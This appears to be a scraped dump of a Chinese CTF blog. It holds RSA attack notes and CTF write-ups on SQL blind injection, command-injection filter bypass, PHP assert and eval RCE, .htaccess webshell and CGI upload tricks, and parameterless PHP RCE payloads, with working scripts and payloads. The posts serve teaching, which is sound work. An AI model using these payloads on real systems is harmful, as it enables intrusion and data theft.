根据e∗d−1e*d-1e∗d−1和phiphiphi的位数之差可以得到kkk的大概范围 在范围中遍历kkk 得到可能的phiphiphi值 nextprime(phinextprime(\\sqrt{phi}nextprime(phi​) 即为qqq p=phiq−1+1p = \\frac{phi}{q-1}+1p=q−1phi​+1 计算 e∗d % (p−1)∗(q−1)e*d\\ \\%\\ (p-1)*(q-1)e∗d % (p−1)∗(q−1) 的结果若为1 则 p,qp, qp,q 值正确，即所得 phiphiphi 值正确 n &amp; ed e∗d=k∗phi+1e*d = k*phi + 1e∗d=k∗phi+1 k=e∗d−1phi=e∗d−1(p−1)∗(q−1)&gt;e∗d−1p∗q=e∗d−1nk = \\frac{e*d - 1}{phi} = \\frac{e*d - 1}{(p - 1)*(q - 1)} &gt; \\frac{e*d - 1}{p*q} = \\frac{e*d - 1}{n}k=phie∗d−1​=(p−1)∗(q−1)e∗d−1​&gt;p∗qe∗d−1​=ne∗d−1​ nnn略大于phiphiphi 则kkk略大于e∗d−1n\\frac{e*d - 1}{n}ne∗d−1​ 爆破即可得到kkk phi=e∗d−1k=(p−1)∗(q−1)phi = \\frac{e*d - 1}{k} = (p - 1)*(q - 1)phi=ke∗d−1​=(p−1)∗(q−1) n−phi+1=p∗q−(p−1)∗(q−1)+1=p+qn - phi + 1= p*q - (p - 1)*(q - 1) + 1 = p + qn−phi+1=p∗q−(p−1)∗(q−1)+1=p+q p−q=(p+q)2−4∗p∗q=(p+q)2−4∗np - q = (p + q)^{2} - 4*p*q = (p + q)^{2} - 4*np−q=(p+q)2−4∗p∗q=(p+q)2−4∗n p=(p+q)+(p−q)2p = \\frac{(p + q)+(p - q)}{2}p=2(p+q)+(p−q)​ q=(p+q)−(p−q)2q = \\frac{(p + q)-(p - q)}{2}q=2(p+q)−(p−q)​ Rabin n=p∗qn = p * qn=p∗q c≡m2mod nc ≡ m^{2} \\mod nc≡m2modn 这种情况下即使已知phiphiphi和eee，也不能通过正常的方法去解出mmm ppp, qqq为素数，即为奇数 则 (p−1)(p - 1)(p−1) 和 (q−1)(q - 1)(q−1) 为均为偶数 则phiphiphi为偶数 gcd(phi,e)=2gcd(phi, e) = 2gcd(phi,e)=2 eee在模phiphiphi的情况下逆元则不存在 这里需要使用Rabin算法来进行计算 其核心为二次剩余以及中国剩余定理 c≡m2mod nc ≡ m^{2} \\mod nc≡m2modn 这里可以分解为两个式子 {cp≡m2≡cmod pcq≡m2≡cmod q\\begin{cases} c_{p} ≡ m^{2} ≡ c \\mod p \\\\ c_{q} ≡ m^{2} ≡ c \\mod q \\end{cases} {cp​≡m2≡cmodpcq​≡m2≡cmodq​ 对于第一个式子 cp≡m2mod pc_{p} ≡ m^{2} \\mod pcp​≡m2modp 则ccc是模ppp的二次剩余 根据欧拉判别法可以得到 cp−12≡1mod pc^{\\frac{p - 1}{2}} ≡ 1 \\mod pc2p−1​≡1modp m2≡c≡c∗cp−12≡cp+12mod pm^{2} ≡ c ≡ c * c^{\\frac{p - 1}{2}} ≡ c^{\\frac{p + 1}{2}} \\mod pm2≡c≡c∗c2p−1​≡c2p+1​modp 开根号得到以下结果 {c1≡cp+14mod pc2≡−cp+14≡p−cp+14mod p\\begin{cases} c_{1} ≡ c^{\\frac{p + 1}{4}} \\mod p \\\\ c_{2} ≡ -c^{\\frac{p + 1}{4}} ≡ p - c^{\\frac{p + 1}{4}} \\mod p \\end{cases} {c1​≡c4p+1​modpc2​≡−c4p+1​≡p−c4p+1​modp​ 对于c模q的情况同理 {c3≡cq+14mod qc4≡−cq+14≡q−cq+14mod q\\begin{cases} c_{3} ≡ c^{\\frac{q + 1}{4}} \\mod q \\\\ c_{4} ≡ -c^{\\frac{q + 1}{4}} ≡ q - c^{\\frac{q + 1}{4}} \\mod q \\end{cases} {c3​≡c4q+1​modqc4​≡−c4q+1​≡q−c4q+1​modq​ 对于以下组合分别进行CRT {c1&amp;c3c1&amp;c4c2&amp;c3c2&amp;c4\\begin{cases} c_{1} \\&amp; c_{3} \\\\ c_{1} \\&amp; c_{4} \\\\ c_{2} \\&amp; c_{3} \\\\ c_{2} \\&amp; c_{4} \\end{cases} ⎩⎪⎪⎪⎨⎪⎪⎪⎧​c1​&amp;c3​c1​&amp;c4​c2​&amp;c3​c2​&amp;c4​​ kp≡q−1mod pk_{p} ≡ q^{-1} \\mod pkp​≡q−1modp kq≡p−1mod qk_{q} ≡ p^{-1} \\mod qkq​≡p−1modq {m1=q∗kp∗c1+p∗kq∗c3mod nm2=q∗kp∗c1+p∗kq∗c4mod nm3=q∗kp∗c2+p∗kq∗c3mod nm4=q∗kp∗c2+p∗kq∗c4mod n\\begin{cases} m_{1} = q*k_{p}*c_{1} + p*k_{q}*c_{3} \\mod n \\\\ m_{2} = q*k_{p}*c_{1} + p*k_{q}*c_{4} \\mod n \\\\ m_{3} = q*k_{p}*c_{2} + p*k_{q}*c_{3} \\mod n \\\\ m_{4} = q*k_{p}*c_{2} + p*k_{q}*c_{4} \\mod n \\end{cases} ⎩⎪⎪⎪⎨⎪⎪⎪⎧​m1​=q∗kp​∗c1​+p∗kq​∗c3​modnm2​=q∗kp​∗c1​+p∗kq​∗c4​modnm3​=q∗kp​∗c2​+p∗kq​∗c3​modnm4​=q∗kp​∗c2​+p∗kq​∗c4​modn​ mmm就存在于四种结果之中 wilson (p−1)!≡−1mod p(p-1)! ≡ -1 \\mod p(p−1)!≡−1modp (p−1)!≡p−1mod p(p-1)! ≡ p-1 \\mod p(p−1)!≡p−1modp (p−2)!≡1mod p(p-2)! ≡ 1 \\mod p(p−2)!≡1modp 求 q!mod pq! \\mod pq!modp 的值 其中 q&lt;pq &lt; pq&lt;p, 且 p−qp - qp−q 的值不大 x=1x = 1x=1 iii 从 q+1q + 1q+1 到 p−2p - 2p−2 进行遍历 x=x∗(i−1mod p)x = x * (i^{-1} \\mod p)x=x∗(i−1modp) 则 q!=xq! = xq!=x openssl public.key 1openssl rsa -pubin -modulus -text -in public.key 得到eee, nnn flag.enc 12345678910111213from Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_OAEPkey_info = RSA.construct((n, e, d, p, q))key = RSA.importKey(key_info.exportKey())key = PKCS1_OAEP.new(key)f = open(&#x27;flag.enc&#x27;, &#x27;r&#x27;).read()c = base64.b64decode(f)m = key.decrypt(c)##################import rsakey = rsa.PrivateKey(n,e,int(d),p,q)c = open(&#x27;flag.enc&#x27;,&#x27;rb&#x27;).read()print(rsa.decrypt(c,key)) coppersmith 101 首先有一个首一的多项式 F(x)=xb+ab−1∗xb−1+...+a1x+a0F(x) = x^b+a_{b-1}*x^{b-1}+...+a_{1}x+a_{0}F(x)=xb+ab−1​∗xb−1+...+a1​x+a0​ 我们知道存在一个整数x0x_{0}x0​，使得F(x0)≡0mod nF(x_{0}) ≡ 0 \\mod nF(x0​)≡0modn 则可以借助coppersmith’s method，将该式转换到整数域上 使得G(x)=0G(x) = 0G(x)=0 Example n=11∗19=209n = 11 * 19 = 209n=11∗19=209 F(x)≡23∗x2+13∗x+61≡0mod nF(x) ≡ 23*x^2 + 13*x + 61 ≡ 0 \\mod nF(x)≡23∗x2+13∗x+61≡0modn 这里的首项不为1，则可以乘上23的逆元 F(x)≡(23∗x2+13∗x+61)∗100≡0mod nF(x) ≡ (23*x^2 + 13*x + 61)*100 ≡ 0 \\mod nF(x)≡(23∗x2+13∗x+61)∗100≡0modn F(x)≡x2+134∗x+40≡0mod nF(x) ≡ x^2+134*x+40 ≡ 0 \\mod nF(x)≡x2+134∗x+40≡0modn G(x)=a∗F(x)+n∗KG(x) = a*F(x) + n*KG(x)=a∗F(x)+n∗K (K为x的多项式) 解得G(6)=0G(6) = 0G(6)=0 即F(6)≡0mod nF(6) ≡ 0 \\mod nF(6)≡0modn 对于RSA的学习大概要告一段落了，该去花点时间学学Web，或是做做题，或是写写PHP。 The End, The Start.","categories":[{"name":"Study","slug":"Study","permalink":"https://yoloyolo.top/categories/Study/"}],"tags":[{"name":"Crypto","slug":"Crypto","permalink":"https://yoloyolo.top/tags/Crypto/"},{"name":"RSA","slug":"RSA","permalink":"https://yoloyolo.top/tags/RSA/"}]},{"title":"CTF题解&杂记","slug":"CTF-Sloves","date":"2021-01-14T12:42:49.000Z","updated":"2022-06-27T18:35:50.000Z","comments":true,"path":"2021/01/14/CTF-Sloves/","link":"","permalink":"https://yoloyolo.top/2021/01/14/CTF-Sloves/","excerpt":"上海市大学生网络安全大赛 UNCTF","text":"上海市大学生网络安全大赛 UNCTF 上海市大学生网络安全大赛 —— TryToLogin 访问Web服务是一个登入框 随便注入下发现基本没用，而且or被ban了 源码提示file参数可以读文件，尝试读 /var/www/html/index.php ，失败 读取apache服务配置文件 file=/etc/apache2/sites-available/000-default.conf 得知Web根目录为 /var/www/secret_dir_2333/html/ file=/var/www/secret_dir_2333/html/index.php 读取源代码如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071//这里整合了两个php文件，至于登入回显部分则从简处理&lt;?phpclass user&#123; public $hostname = &#x27;127.0.0.1&#x27;; public $username = &#x27;root&#x27;; public $password = &#x27;root&#x27;; public $database = &#x27;ctf&#x27;; private $mysqli = null; public function __construct() &#123; $this-&gt;mysqli = mysqli_connect( $this-&gt;hostname, $this-&gt;username, $this-&gt;password ); mysqli_select_db($this-&gt;mysqli,$this-&gt;database); &#125; public function filter() &#123; $_POST[&#x27;username&#x27;] = addslashes($_POST[&#x27;username&#x27;]); $_POST[&#x27;password&#x27;] = addslashes($_POST[&#x27;password&#x27;]); $safe1 = preg_match(&#x27;/inn|or/is&#x27;, $_POST[&#x27;username&#x27;]); $safe2 = preg_match(&#x27;/inn|or/is&#x27;, $_POST[&#x27;password&#x27;]); if($safe1 === 0 and $safe2 === 0)&#123; return true; &#125;else&#123; die(&#x27;No hacker!&#x27;); &#125; &#125; public function login() &#123; $this-&gt;filter(); $username = $_POST[&#x27;username&#x27;]; $password = $_POST[&#x27;password&#x27;]; $sql = &quot;select * from user where username=&#x27;%s&#x27; and password=&#x27;$password&#x27;&quot;; $sql = sprintf($sql,$username); $result = mysqli_query($this-&gt;mysqli,$sql); $result = mysqli_fetch_object($result); if($result-&gt;id)&#123; return 1; &#125;else&#123; return 0; &#125; &#125;session_start();if(isset($_GET[&#x27;file&#x27;]))&#123; if(preg_match(&#x27;/flag/is&#x27;, $_GET[&#x27;file&#x27;]) === 0) &#123; echo file_get_contents(&#x27;/&#x27;.$_GET[&#x27;file&#x27;]); &#125;&#125;if(isset($_POST[&#x27;password&#x27;]))&#123; $user = new user; $login = $user-&gt;login(); if($login) &#123; echo &quot;Success!&quot;; &#125; else &#123; echo &quot;Wrong!&quot;; &#125;&#125;?&gt; 一开始面对addslashes()还不知道怎么Bypass 然后看到 $sql = sprintf($sql,$username); 百度之后查到了一篇文章 http://bey0nd.xyz/2018/11/05/1/ %s只是字符串格式化username，漏洞点肯定不在这里 就在password处开始造作 123输入 处理 格式化&#39; -&gt; \\&#39; -&gt; \\&#39;%&#39; -&gt; %\\&#39; -&gt; %&#39; 那么就要让password抢掉username的格式化，可以使用占位符 or被过滤则可以使用|| 而$username可以放空，以避免格式化字符串时出乱子 payload: 1password&#x3D;%1$&#39;||1# 就可以基于这个登入成功或失败的回显来进行盲注 12345678910111213141516171819202122232425#祖传异或注入脚本import requestsr = requests.session()dbname = &#x27;&#x27;for i in range(1,50): bot = 32 top = 128 mid = (bot + top) // 2 while(bot &lt; top): url = &#x27;http://eci-2zegdefmmywv8xtsuu90.cloudeci1.ichunqiu.com/index.php&#x27; #查库 #data=&#123;&#x27;usernaem&#x27;:&#x27;&#x27;, &#x27;password&#x27;:&#x27;%1$\\&#x27;||(ascii(substr((select database()),&#123;&#125;,1))&gt;&#123;&#125;)#&#x27;.format(i,mid)&#125; #查表 #data=&#123;&#x27;usernaem&#x27;:&#x27;&#x27;, &#x27;password&#x27;:&#x27;%1$\\&#x27;||(ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;)#&#x27;.format(i,mid)&#125; data=&#123;&#x27;usernaem&#x27;:&#x27;&#x27;, &#x27;password&#x27;:&#x27;%1$\\&#x27;||(ascii(substr((select * from fl4g),&#123;&#125;,1))&gt;&#123;&#125;)#&#x27;.format(i,mid)&#125; res=r.post(url=url, data=data) if &quot;Success&quot; in res.text: bot = mid + 1 else: top = mid mid = (bot + top) // 2 if(mid == 32 or mid == 127): break dbname = dbname + chr(mid) print(dbname) 现在才想起来substr是从1开始的 这里有两个点可以提一下 Bypass information_schema 前两周刷BUUOJ刷到的知识点，躺在to_do_list里面就一直没看，结果这个题差点在这一步卡死 因为or被过滤了，不能使用information_schema库来进行查库查表查列的组合拳 而mysql 5.7版本可以使用sys库中的一些表来查询库名和表名 个人总结如下 1234567891011121314151617sys.schema_object_overview db 库名sys.schema_table_statistics table_schema 库名 table_name 表名sys.schema_table_statistics_with_buffer table_schema 库名 table_name 表名sys.x$schema_index_statistics table_schema 库名 table_name 表名sys.x$schema_table_statistics table_schema 库名 table_name 表名sys.x$ps_schema_table_statistics_io table_schema 库名 table_name 表名 这里只写出了几个通用的表 另外一种方法则是innodb，不过也被ban了 而且这个要求的服务mysql默认是不开启的，门槛较高 这里倒不用继续猜列名 直接 select * from fl4g 就能出flag substr 与 select 与 column 当时随便打了个 select * from fl4g 就出flag了，也没多想 后面想到如果是这种盲注的情况，能不能无列名读取账户表 结论是不行，substr内进行select操作 若该表只有一列，则可以使用select *，无需知道列名 flag表就是这样 若该表有多列，则必须指定一个列名，或者使用concat/group_concat连接多个列名 盲注ban了or还要查列名的情况还真没遇到过 有错误回显的情况下可以进行列名的获取 12345678MariaDB [ctf]&gt; select * from flag union all select * from (select * from user as a join user b)c;ERROR 1060 (42S21): Duplicate column name &#39;id&#39;MariaDB [ctf]&gt; select * from flag union all select * from (select * from user as a join user b using(id))c;ERROR 1060 (42S21): Duplicate column name &#39;username&#39;MariaDB [ctf]&gt; select * from flag union all select * from (select * from user as a join user b using(id,username))c;ERROR 1060 (42S21): Duplicate column name &#39;email&#39;MariaDB [ctf]&gt; select * from flag union all select * from (select * from user as a join user b using(id,username,email))c;ERROR 1222 (21000): The used SELECT statements have a different number of columns UNCTF —— UN’s_online_tools 进入页面是一个Ping Tool 经典的命令注入 输入|ls，得到回显 index.php style.css 尝试了一下别的输入之后发现存在黑名单，先尝试读取index.php 12base64 index.phpbase64&lt;index.php 这里使用tab符或&lt;都能用于代替空格 或者使用strings来读取，不过看源码可能有点麻烦 12345678910111213141516&lt;?phpif (isset($_GET[&#x27;url&#x27;]))&#123; $ip=$_GET[&#x27;url&#x27;]; if(preg_match(&quot;/(;|&#x27;| |&gt;|]|&amp;| |\\\\$|\\\\|rev|more|tailf|head|nl|tail|tac|cat|rm|cp|mv|\\*|\\&#123;)/i&quot;, $ip))&#123; die(&quot;&lt;strong&gt;&lt;center&gt;非法字符&lt;/center&gt;&lt;/strong&gt;&quot;); &#125; if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123; die(&quot;&lt;strong&gt;&lt;center&gt;非法字符&lt;/center&gt;&lt;/strong&gt;&quot;); &#125; $a = shell_exec(&quot;ping -c 4 &quot;.$ip); echo($a);&#125;else&#123; echo &quot;&lt;script&gt;alert(&#x27;欢迎来到UN`s online tools 如果师傅觉得题目不适合您，可以出门左拐&#x27;)&lt;/script&gt;&quot;;&#125;?&gt; 1|ls &#x2F; 可以看到flag在根目录下 但是第二层正则则对于&quot;flag&quot;过滤得很严 只能使用base64进行bypass 1|&#96;echo Y2F0IC9mbGFn|base64 -d&#96; base64解码的结果为&quot;cat /flag&quot; 然后再通过``执行这个命令，即可读取flag UNCTF —— L0vephp 查看源代码，看到两段注释内容 12flag.phpB4Z0-@:OCnDf, 实在看不出来是什么编码，丢进basecrack base85的解码结果为get action 尝试?action=/etc/passwd 可以读取passwd文件 使用base64编码读取flag.php时发现被ban 使用rot13读取flag.php ?action=php://filter/string.toupper|string.rot13/resource=flag.php 在注释中看到flag.php的内容 rot13解码之后的内容如下 1234&lt;?PHP$FLAG = &quot;UNCTF&#123;7HIS_IS_@_F4KE_F1A9&#125;&quot;;//HINT:316E4433782E706870?&gt; 316E4433782E706870 进行Base16解码得到 1nD3x.php 访问1nD3x.php 内容如下 1234567891011121314151617181920212223242526272829&lt;?phperror_reporting(0);show_source(__FILE__);$code=$_REQUEST[&#x27;code&#x27;];$_=array(&#x27;@&#x27;,&#x27;\\~&#x27;,&#x27;\\^&#x27;,&#x27;\\&amp;&#x27;,&#x27;\\?&#x27;,&#x27;\\&lt;&#x27;,&#x27;\\&gt;&#x27;,&#x27;\\*&#x27;,&#x27;\\`&#x27;,&#x27;\\+&#x27;,&#x27;\\-&#x27;,&#x27;\\&#x27;&#x27;,&#x27;\\&quot;&#x27;,&#x27;\\\\\\\\&#x27;,&#x27;\\/&#x27;); $__=array(&#x27;eval&#x27;,&#x27;system&#x27;,&#x27;exec&#x27;,&#x27;shell_exec&#x27;,&#x27;assert&#x27;,&#x27;passthru&#x27;,&#x27;array_map&#x27;,&#x27;ob_start&#x27;,&#x27;create_function&#x27;,&#x27;call_user_func&#x27;,&#x27;call_user_func_array&#x27;,&#x27;array_filter&#x27;,&#x27;proc_open&#x27;);$blacklist1 = array_merge($_);$blacklist2 = array_merge($__);if (strlen($code)&gt;16)&#123; die(&#x27;Too long&#x27;);&#125;foreach ($blacklist1 as $blacklisted) &#123; if (preg_match (&#x27;/&#x27; . $blacklisted . &#x27;/m&#x27;, $code)) &#123; die(&#x27;WTF???&#x27;); &#125; &#125; foreach ($blacklist2 as $blackitem) &#123; if (preg_match (&#x27;/&#x27; . $blackitem . &#x27;/im&#x27;, $code)) &#123; die(&#x27;Sry,try again&#x27;); &#125;&#125;@eval($code);?&gt; 过滤了很多内容 可以使用php变长参数 1234?1[]=test&amp;1[]=phpinfo()&amp;2=assertecho var_dump(...$_GET);array(2) &#123; [0]=&gt; string(4) &quot;test&quot; [1]=&gt; string(9) &quot;phpinfo()&quot; &#125; string(6) &quot;assert&quot; 使用usort进行命令执行 （assert支持多个参数的代码执行） 12GET: 1[]&#x3D;test&amp;1[]&#x3D;system(&#39;cat &#x2F;flag_mdnrvvldb&#39;)&amp;2&#x3D;assertPOST: code&#x3D;usort(...$GET); UNCTF —— easy_upload 内容匹配 1preg_match(&quot;/perl|pyth|ph|auto|curl|\\|base|&gt;|rm|ryby|openssl|war|lua|msf|xter|telnet/i&quot;,$black) 这里的 “||base|“匹配”|base” 详见 PHP正则二次转义(DATA_EXPUNGED) 文件名匹配 1preg_match(&quot;/ph|ml|js|cg/i&quot;, $name) 两种思路 WebShell 123#.htaccessSetHandler application&#x2F;x-httpd-p\\hp 12#a.jpg&lt;?&#x3D;@eval($_GET[&quot;cmd&quot;]); CGI 123#.htaccessOptions ExecCGIAddHandler cgi-script .xxx 123456#a.xxx#!&#x2F;bin&#x2F;bashecho &quot;Content-Type: text&#x2F;plain&quot;echo &quot;&quot;cat &#x2F;flagexit 0 相关链接 .htaccess Trick分享","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://yoloyolo.top/categories/WriteUp/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://yoloyolo.top/tags/Web/"},{"name":"SQL_Injection","slug":"SQL-Injection","permalink":"https://yoloyolo.top/tags/SQL-Injection/"},{"name":"RCE","slug":"RCE","permalink":"https://yoloyolo.top/tags/RCE/"},{"name":"File_Upload","slug":"File-Upload","permalink":"https://yoloyolo.top/tags/File-Upload/"},{"name":"PHP","slug":"PHP","permalink":"https://yoloyolo.top/tags/PHP/"}]},{"title":"PHP无参数RCE","slug":"PHP-RCE-Without-Parameters","date":"2021-01-14T12:27:25.000Z","updated":"2022-06-10T17:25:08.000Z","comments":true,"path":"2021/01/14/PHP-RCE-Without-Parameters/","link":"","permalink":"https://yoloyolo.top/2021/01/14/PHP-RCE-Without-Parameters/","excerpt":"CTF中PHP无参数RCE小结","text":"CTF中PHP无参数RCE小结 核心代码如下 1234if(&#x27;;&#x27; === preg_replace(&#x27;/[^\\W]+\\((?R)?\\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;code&#x27;]))&#123; eval($_GET[&#x27;code&#x27;]);&#125; 一般会在此基础上过滤一些函数以增加难度 正则表达式的用于匹配样式如下的字符串 a(); a(bb()); a(bb(ccc())); a()bb(); a(bb())ccc(dddd()); … BTW: 可能在正则递归匹配时会Ban掉’_’ 常用函数 get_defined_functions() : 显示所有函数 localeconv() : 返回一个包含本地数字及货币格式信息的数组，第一个元素为’.’ scandir() : 返回指定目录中的文件和目录的数组 pos() : 输出当前内部指针所指向的元素 current() : 返回数组当前单元，同pos() end() : 将内部指针指向数组中的最后一个元素，并输出。 next() : 函数将内部指针指向数组中的下一个元素，并输出 file() : 读取一个文件，返回的数组中元素对应每一行的内容 readfile() : 读取一个文件 sqrt() : 返回一个数字的平方根 tan() : 返回一个数字的正切弧度值 atan() : 返回一个数字的反正切弧度值 cosh() : 返回一个数字的双曲余弦 sinh() : 返回一个数字的双曲正弦 ceil() : 返回向上取整 floor() : 返回向下取整 round() ： 返回四舍五入取整 chr() : 返回指定ASCII值的字符 ord() : 返回字符串中第一个字符 ASCII值 chdir() : 改变当前的目录 localtime(timestamp,is_assoc) : 取得本地时间，数组的第一个元素为秒 time() : 对应localtime()的timestamp phpversion() : 返回php版本号 crypt() : 使用盐值生成Hash hebrevc() : 反向显示希伯来字符 strrev() : 反转字符串 file() : 把整个文件读入一个数组中 array_reverse() : 返回翻转顺序的数组 array_flip() : 反转/交换数组中的键名和对应关联的键值 array_rand() : 返回一个包含随机键名的数组 生成 . 的四个思路 strrev(crypt()) 生成Hash，并将最后一位的.逆序到第一位，可以使用serialize(array())或phpversion()作为内嵌函数 localeconv() 选取第一个元素 数学函数套娃Fuzz localtime(time()) 第46秒 [GXYCTF2019]禁止套娃 12345678910111213141516171819202122232425&lt;?phpinclude &quot;flag.php&quot;;echo &quot;flag在哪里呢？&lt;br&gt;&quot;;if(isset($_GET[&#x27;exp&#x27;]))&#123; if (!preg_match(&#x27;/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i&#x27;, $_GET[&#x27;exp&#x27;])) &#123; if(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\\((?R)?\\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])) &#123; if (!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])) &#123; // echo $_GET[&#x27;exp&#x27;]; @eval($_GET[&#x27;exp&#x27;]); &#125; else&#123; die(&quot;还差一点哦！&quot;); &#125; &#125; else&#123; die(&quot;再好好想想！&quot;); &#125; &#125; else&#123; die(&quot;还想读flag，臭弟弟！&quot;); &#125;&#125;// highlight_file(__FILE__);?&gt; 且当前目录的文件如下 array(5) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(4) &quot;.git&quot; [3]=&gt; string(8) &quot;flag.php&quot; [4]=&gt; string(9) &quot;index.php&quot; &#125; 不能控制数组指针直接指向flag.php，只能进行随机读取 Payload0 1var_dump(readfile(array_rand(array_flip(scandir(chr(ord(strrev(crypt(phpversion()))))))))); 分析 phpversion() #用于输出php当前版本信息 crypt(phpversion()) #加密信息，最后一位有可能为. strrev(crypt(phpversion())) #字符串逆序，将.移动至第一位 ord(strrev(crypt(phpversion()))) #取第一位的ASCII码值 chr(ord(strrev(crypt(phpversion())))) #转为字符，配合上一步可以节选出第一位的. scandir(chr(ord(strrev(crypt(phpversion()))))) #扫描当前目录 array_flip(scandir(chr(ord(strrev(crypt(phpversion())))))) #将扫描结果数组交换键名与键值 array_rand(array_flip(scandir(chr(ord(strrev(crypt(phpversion()))))))) #随机选取数组键名，即随机选取文件名 readfile(array_rand(array_flip(scandir(chr(ord(strrev(crypt(phpversion())))))))) #读取文件 var_dump(readfile(array_rand(array_flip(scandir(chr(ord(strrev(crypt(phpversion()))))))))) #输出读取文件结果 Payload1 1var_dump(readfile(array_rand(array_flip(scandir(pos(localeconv())))))); 分析 localeconv() #生成数组，第一个元素为. pos(localeconv()) #取第一个元素，即. scandir(pos(localeconv())) #扫描当前目录 array_flip(scandir(pos(localeconv()))) #将扫描结果数组交换键名与键值 array_rand(array_flip(scandir(pos(localeconv())))) #随机选取数组键名，即随机选取文件名 readfile(array_rand(array_flip(scandir(pos(localeconv()))))) #读取文件 var_dump(readfile(array_rand(array_flip(scandir(pos(localeconv())))))) #输出读取文件结果 Payload2 1var_dump(readfile(array_rand(array_flip(scandir(chr(ceil(sinh(cosh(tan(ceil(atan(phpversion())))))))))))); 分析 phpversion() #输出php当前版本 ceil(cosh(cosh(tan(ceil(atan(phpversion())))))) #使用数学函数计算得出46 chr(ceil(sinh(cosh(tan(ceil(atan(phpversion()))))))) #将46转为. scandir(chr(ceil(sinh(cosh(tan(ceil(atan(phpversion())))))))) #扫描当前目录 array_rand(array_flip(scandir(chr(ceil(sinh(cosh(tan(ceil(atan(phpversion())))))))))) #随机选取数组键名，即随机选取文件名 readfile(array_rand(array_flip(scandir(chr(ceil(sinh(cosh(tan(ceil(atan(phpversion()))))))))))) #读取文件 var_dump(readfile(array_rand(array_flip(scandir(chr(ceil(sinh(cosh(tan(ceil(atan(phpversion())))))))))))) #输出读取文件结果 Fuzz脚本 123456789101112131415161718&lt;?php ini_set(&quot;display_errors&quot;, &quot;off&quot;); function pass($para) &#123; return $para; &#125; $func = array(&#x27;sqrt&#x27;, &#x27;tan&#x27;, &#x27;sinh&#x27;, &#x27;cosh&#x27;, &#x27;atan&#x27;, &#x27;ceil&#x27;, &#x27;floor&#x27;, &#x27;cos&#x27;, &#x27;sin&#x27;, &#x27;pass&#x27;); foreach($func as $a)&#123; foreach($func as $b)&#123; foreach($func as $c)&#123; foreach($func as $d)&#123; foreach($func as $e)&#123; if(ceil($a($b($c($d($e(phpversion())))))) == 46) &#123; echo &quot;ceil($a($b($c($d($e(phpversion()))))))\\n&quot;; &#125; &#125;&#125;&#125;&#125;&#125;?&gt; php中并没有类似于python中的pass()，所以有点可惜 这里udf的pass()是为了更便利地进行fuzz 使用数学函数最少需要六次迭代，使用pass()能够在更多次迭代中找到迭代次数更少的解法 [ByteCTF2019]Boring_Code 节选部分代码 1234567891011121314&lt;?php$code = $_GET[&quot;code&quot;];if (&#x27;;&#x27; === preg_replace(&#x27;/[a-z]+\\((?R)?\\)/&#x27;, NULL, $code))&#123; if (preg_match(&#x27;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#x27;, $code)) &#123; echo &#x27;bye~&#x27;; &#125; else &#123; eval($code); &#125;&#125;?&gt; flag为上层目录的最后一个文件 Payload0 1echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))))))); 分析 localeconv() #生成数组，第一个元素为. pos(localeconv()) #取第一个元素，即. scandir(pos(localeconv())) #扫描当前目录 next(scandir(pos(localeconv()))) #选取元素.. chdir(next(scandir(pos(localeconv())))) #进入上级目录 time(chdir(next(scandir(pos(localeconv()))))) #生成时间戳，php7.4版本中无法进行内嵌函数 localtime(time(chdir(next(scandir(pos(localeconv())))))) #将时间戳转为数组形式的本地时间 pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))) #选取第一个元素，即秒 chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))) #转为ASCII字符，46秒时执行可以得到. scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))) #扫描当前目录 end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))))) #选取最后一个文件，即flag文件 readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))))) #读取flag文件 echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))))))) #输出读取flag文件的内容 Payload1 1if(chdir(next(scandir(chr(ord(strrev(crypt(serialize(array()))))))))echo(readfile(end(scandir(strrev(crypt(serialize(array())))))))); 分析 if语句用于返回上一级，且chdir的返回结果为1，控制if语句执行之后的用于读取flag的嵌套函数 [第五届上海市大学生网络安全大赛]Decade 1234567891011121314151617&lt;?phphighlight_file(__FILE__);$code = $_GET[&#x27;code&#x27;];if (!empty($code)) &#123; if (&#x27;;&#x27; === preg_replace(&#x27;/[a-z]+\\((?R)?\\)/&#x27;, NULL, $code)) &#123; if (preg_match(&#x27;/readfile|if|time|local|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#x27;, $code)) &#123; echo &#x27;bye~&#x27;; &#125; else &#123; eval($code); &#125; &#125; else &#123; echo &quot;No way!!!&quot;; &#125;&#125;else &#123; echo &quot;No way!!!&quot;; &#125; 这里简单写一下读取文件的思路 由于readfile被Ban，所以需要使用file()来进行文件读取 至于flag的输出，可以使用serialize()进行序列化，join()来讲数组转为字符串，或者用next()指向flag","categories":[{"name":"Study","slug":"Study","permalink":"https://yoloyolo.top/categories/Study/"}],"tags":[{"name":"RCE","slug":"RCE","permalink":"https://yoloyolo.top/tags/RCE/"},{"name":"PHP","slug":"PHP","permalink":"https://yoloyolo.top/tags/PHP/"}]},{"title":"泉州市网络安全攻防比赛线下赛复盘","slug":"Reflection-For-Quanzhou-Race","date":"2021-01-14T12:24:07.000Z","updated":"2021-01-16T05:46:53.000Z","comments":true,"path":"2021/01/14/Reflection-For-Quanzhou-Race/","link":"","permalink":"https://yoloyolo.top/2021/01/14/Reflection-For-Quanzhou-Race/","excerpt":"AWD小结&amp;反思","text":"AWD小结&amp;反思 Attack 理想化的攻击流程应该为 